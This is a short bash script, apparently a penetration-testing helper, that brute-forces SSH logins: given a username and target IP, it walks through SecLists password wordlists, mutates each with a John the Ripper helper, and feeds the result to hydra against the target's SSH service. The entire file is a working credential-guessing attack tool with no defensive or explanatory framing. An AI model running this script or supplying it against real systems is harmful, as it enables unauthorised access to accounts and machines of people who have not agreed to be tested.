#!/bin/bash

usage() {
    echo "$0 <USER> <IP>"
    exit 1
}
if [ "$#" -ne 2 ]; then
    usage
fi
USERNAME=$1
PASSWORD_PATH=/usr/share/wordlists/SecLists/Passwords
IP_TARGET=$2
for wordlist in $(ls -1Sr ${PASSWORD_PATH} | grep .txt); do
    echo "Generating mutated wordlist for $wordlist" 
    john_gen.sh ${PASSWORD_PATH}/${wordlist} mutated.txt
    echo "Trying hydra -v -t4 -l $USERNAME -P $wordlist $IP_TARGET ssh"
    hydra -v -t4 -l $USERNAME -P mutated.txt $IP_TARGET ssh
done
